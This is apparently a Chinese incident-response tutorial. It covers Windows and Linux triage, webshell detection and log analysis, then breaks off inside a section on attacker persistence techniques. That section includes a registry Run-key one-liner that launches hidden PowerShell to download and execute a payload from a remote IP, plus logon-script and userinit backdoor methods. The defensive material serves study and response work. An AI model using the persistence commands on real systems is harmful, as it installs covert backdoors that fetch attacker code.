scheduler</p>\n<p>注册表启动项</p>\n<p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</p>\n<p>组策略 gpedit.msc 中 自启</p>\n<p>Windows 设置 -&gt; 脚本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108124205969.png\" alt=\"image-20221108124205969\"></p>\n</blockquote>\n<p>总结:<br>\n 用户 -&gt; 端口 -&gt; 进程 -&gt; 注册表 -&gt; 启动项 -&gt; 任务计划 -&gt; 服务 -&gt; 组策略</p>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h3>\n<h4 id=\"账户-2\"><a class=\"markdownIt-Anchor\" href=\"#账户-2\">#</a> 账户</h4>\n<p>1.passwd</p>\n<p>awk -F:  ‘{print $1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">3,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span></span></span></span>NF}’  | grep -Ev ‘nologin’</p>\n<p>排查 uid 和 gid , 和 bash</p>\n<p>2.shadow</p>\n<p>shadow 中第二列为！代表不能登录</p>\n<p>能正常登录的用户在第二列会有加密的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">2、查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4、禁用或删除多余及可疑的帐号</span><br><span class=\"line\">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class=\"line\">\tuserdel user       删除 user 用户</span><br><span class=\"line\">\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>\n<p>sudoers 中的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Allow root to run any commands anywhere </span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows members of the &#x27;sys&#x27; group to run networking, software, </span><br><span class=\"line\">## service management apps and more.</span><br><span class=\"line\"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows people in group wheel to run all commands</span><br><span class=\"line\">%wheel  ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Same thing without a password</span><br><span class=\"line\"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n<p>因此可能存在 sudo 提权</p>\n<h4 id=\"历史命名\"><a class=\"markdownIt-Anchor\" href=\"#历史命名\">#</a> 历史命名</h4>\n<p>可以查看不同用户的历史命令 ～/.bash_history</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、root 用户的历史命令</span><br><span class=\"line\">histroy</span><br><span class=\"line\">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class=\"line\">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class=\"line\">1）保存1万条命令</span><br><span class=\"line\">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class=\"line\">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class=\"line\">######jiagu history xianshi#########</span><br><span class=\"line\">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class=\"line\">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">USER_IP=`hostname`</span><br><span class=\"line\">fi</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class=\"line\">shopt -s histappend</span><br><span class=\"line\">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class=\"line\">######### jiagu history xianshi ##########</span><br><span class=\"line\">3）source /etc/profile 让配置生效</span><br><span class=\"line\">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class=\"line\">3、历史操作命令的清除：history -c</span><br><span class=\"line\">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>\n<h4 id=\"端口-2\"><a class=\"markdownIt-Anchor\" href=\"#端口-2\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -lntup | more</span><br><span class=\"line\">查看下 pid 所对应的进程文件路径，</span><br><span class=\"line\">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br><span class=\"line\">如果要排查对应的pid的执行文件</span><br><span class=\"line\">在/proc/$pid/exe</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos 6852]# pwd</span><br><span class=\"line\">/proc/6852</span><br><span class=\"line\">[root@VM-16-11-centos 6852]# ls -al</span><br><span class=\"line\">dr-xr-xr-x   9 lighthouse lighthouse 0 Sep 11 14:30 .</span><br><span class=\"line\">dr-xr-xr-x 163 root       root       0 Mar 22  2022 ..</span><br><span class=\"line\">dr-xr-xr-x   2 lighthouse lighthouse 0 Nov  8 17:00 attr</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 cwd -&gt; /www/wwwroot/www.radsm.co/beef_1/beef</span><br><span class=\"line\">-r--------   1 lighthouse lighthouse 0 Nov  8 17:01 environ</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 exe -&gt; /home/lighthouse/.rvm/rubies/ruby-3.0.3/bin/ruby</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"进程-2\"><a class=\"markdownIt-Anchor\" href=\"#进程-2\">#</a> 进程</h4>\n<blockquote>\n<p>ps aux | ps ef</p>\n</blockquote>\n<h4 id=\"启动项\"><a class=\"markdownIt-Anchor\" href=\"#启动项\">#</a> 启动项</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br></pre></td></tr></table></figure>\n<h4 id=\"任务计划\"><a class=\"markdownIt-Anchor\" href=\"#任务计划\">#</a> 任务计划</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l   列出某个用户cron服务的详细内容</span><br><span class=\"line\"></span><br><span class=\"line\">重点关注以下目录中是否存在恶意脚本</span><br><span class=\"line\">/var/spool/cron/* </span><br><span class=\"line\">/etc/crontab</span><br><span class=\"line\">/etc/cron.d/*</span><br><span class=\"line\">/etc/cron.daily/* </span><br><span class=\"line\">/etc/cron.hourly/* </span><br><span class=\"line\">/etc/cron.monthly/*</span><br><span class=\"line\">/etc/cron.weekly/</span><br><span class=\"line\">/etc/anacrontab</span><br><span class=\"line\">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>\n<h4 id=\"日志\"><a class=\"markdownIt-Anchor\" href=\"#日志\">#</a> 日志</h4>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class=\"line\">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">定位有哪些IP在爆破：</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class=\"line\"></span><br><span class=\"line\">爆破用户名字典是什么？</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure| awk &#x27;&#123;print $9&#125;&#x27; | sort -nr | uniq -c</span><br><span class=\"line\"> </span><br><span class=\"line\">2、登录成功的IP有哪些： \t</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">登录成功的日期、用户名、IP：</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class=\"line\"></span><br><span class=\"line\">3、增加一个用户kali日志：</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class=\"line\">, shell=/bin/bash</span><br><span class=\"line\">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class=\"line\">#grep &quot;useradd&quot; /var/log/secure </span><br><span class=\"line\"></span><br><span class=\"line\">4、删除用户kali日志：</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\"># grep &quot;userdel&quot; /var/log/secure</span><br><span class=\"line\"></span><br><span class=\"line\">5、su切换用户：</span><br><span class=\"line\">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo授权执行:</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108174528702.png\" alt=\"image-20221108174528702\"></p>\n<p>账户 历史命令 端口 进程 开机启动 任务计划 日志</p>\n<h3 id=\"webshell-查杀\"><a class=\"markdownIt-Anchor\" href=\"#webshell-查杀\">#</a> webshell 查杀</h3>\n<h4 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>1.D 盾</p>\n<p>2. 河马</p>\n<p>3. 百度 webdir</p>\n<p>4. 在线 webshell 查杀 bugscanner</p>\n<h4 id=\"发现webshell后门\"><a class=\"markdownIt-Anchor\" href=\"#发现webshell后门\">#</a> 发现 webshell 后门</h4>\n<p>1. 判断 hash</p>\n<p>2.diff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -c -a -r cms1 cms2</span><br><span class=\"line\">md5sum比较两个文件夹下面文件是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">Copy文件夹之后，检测两个文件夹（dir1，dir2）下文件是否相同。logdir 是任何一个存放生成文件的目录</span><br><span class=\"line\">cd dir1</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\"></span><br><span class=\"line\">cd dir2</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\">cd logdir</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">diff result.txt result.txt</span><br></pre></td></tr></table></figure>\n<p>3. 工具</p>\n<p>winMerge</p>\n<p>beyond compare</p>\n<h2 id=\"日志分析\"><a class=\"markdownIt-Anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<h3 id=\"windows日志分析\"><a class=\"markdownIt-Anchor\" href=\"#windows日志分析\">#</a> Windows 日志分析</h3>\n<p>Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n<blockquote>\n<p>系统日志</p>\n<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。</p>\n<p>默认位置： % SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</p>\n<p>应用程序日志</p>\n<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</p>\n<p>安全日志</p>\n<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</p>\n</blockquote>\n<p><strong>开启审核策略</strong></p>\n<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109145256851.png\" alt=\"image-20221109145256851\"></p>\n<p><strong>设置日志属性</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192149696.png\" alt=\"image-20221109192149696\"></p>\n<h4 id=\"日志分析-2\"><a class=\"markdownIt-Anchor\" href=\"#日志分析-2\">#</a> 日志分析</h4>\n<p>对于 Windows 事件日志分析，不同的 EVENT ID 代表了不同的意义，摘录一些常见的安全事件的说明：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109144436445.png\" alt=\"image-20221109144436445\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109153134531.png\" alt=\"image-20221109153134531\"></p>\n<p>4634,4647 远程登录注销时触发</p>\n<h4 id=\"工具分析\"><a class=\"markdownIt-Anchor\" href=\"#工具分析\">#</a> 工具分析：</h4>\n<p><strong>Log Parser</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录成功的所有事件</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">指定登录时间范围的事件：</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提取登录成功的用户名和IP：</span><br><span class=\"line\">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>LogParser Lizard</strong></p>\n<p><strong>Event Log Explorer</strong></p>\n<h3 id=\"linux-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#linux-日志分析\">#</a> linux 日志分析</h3>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192416867.png\" alt=\"image-20221109192416867\"></p>\n<p>比较重要的几个日志：<br>\n登录失败记录：/var/log/btmp     //lastb</p>\n<p>​\t最后一次登录：/var/log/lastlog  //lastlog</p>\n<p>​\t登录成功记录: /var/log/wtmp     //last</p>\n<p>​\t登录日志记录：/var/log/secure</p>\n<p>​\t目前登录用户信息：/var/run/utmp  //w、who、users</p>\n<p>​\t历史命令记录：history</p>\n<p>​\t仅清理当前用户： history -c</p>\n<p>日志分析 find grep egrep awk sed</p>\n<h3 id=\"web-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#web-日志分析\">#</a> web 日志分析</h3>\n<p>Apache 日志分析技巧：</p>\n<p>Web 访问日志记录了 Web 服务器接收处理请求及运行时错误等各种原始信息。通过对 WEB 日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、列出当天访问次数最多的IP命令：</span><br><span class=\"line\">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class=\"line\"></span><br><span class=\"line\">2、查看当天有多少个IP访问：</span><br><span class=\"line\">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">3、查看某一个页面被访问的次数：</span><br><span class=\"line\">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">4、查看每一个IP访问了多少个页面：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class=\"line\"></span><br><span class=\"line\">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class=\"line\"></span><br><span class=\"line\">6、查看某一个IP访问了哪些页面：</span><br><span class=\"line\">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">7、去掉搜索引擎统计当天的页面：</span><br><span class=\"line\">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class=\"line\">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l\t</span><br></pre></td></tr></table></figure>\n<p>日志分析过程</p>\n<p>1、定位攻击源</p>\n<p>2、搜索相关日志记录</p>\n<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>\n<p>4. 加固攻击者访问的网站</p>\n<h3 id=\"mysql日志分析\"><a class=\"markdownIt-Anchor\" href=\"#mysql日志分析\">#</a> mysql 日志分析</h3>\n<p>设置日志</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查看log配置信息</span><br><span class=\"line\">show variables like &#x27;%general%&#x27;;</span><br><span class=\"line\">2、开启日志</span><br><span class=\"line\">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class=\"line\">3、指定日志文件路径</span><br><span class=\"line\">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>\n<p>主要需要注意爆破 root 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#有哪些IP在爆破</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class=\"line\">     27 192.168.204.1</span><br><span class=\"line\"></span><br><span class=\"line\">#爆破用户名字典都有哪些</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class=\"line\">     13 mysql</span><br><span class=\"line\">     12 root</span><br><span class=\"line\">      1 root</span><br><span class=\"line\">      1 mysql</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>如果爆破密码，失败的时候会显示 &quot;Access denied&quot;，可靠此进行分析</p>\n<h2 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<h3 id=\"windows-2\"><a class=\"markdownIt-Anchor\" href=\"#windows-2\">#</a> Windows</h3>\n<h4 id=\"0x01-注册表自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x01-注册表自启动\">#</a> 0x01 注册表自启动</h4>\n<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Run键 </span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"></span><br><span class=\"line\"># Winlogon\\Userinit键</span><br><span class=\"line\">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\"></span><br><span class=\"line\">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure>\n<p><strong>不落地的后门通过 cs 的 web 投递生成</strong></p>\n<p>使用以下命令可以一键实现无文件注册表后门：不落地</p>\n<p><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.174.131/a'))\\&quot;&quot; /f</code></p>\n<p><strong>Logon Scripts 后门</strong></p>\n<p>注册表路径：HKEY_CURRENT_USER\\Environment\\</p>\n<p>创建字符串键值：  UserInitMprLogonScript，键值设置为 bat 的绝对路径： <code>c:\\test.bat</code></p>\n<p><strong>userinit 后门</strong></p>\n<p>在用户进行登陆时，winlogon 运行指定的程序。根据官方文档，可以更改它的值来添加与删除程序。</p>\n<p>利用 USERINIT 注册表键实现无文件后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]</span><br><span class=\"line\"> </span><br><span 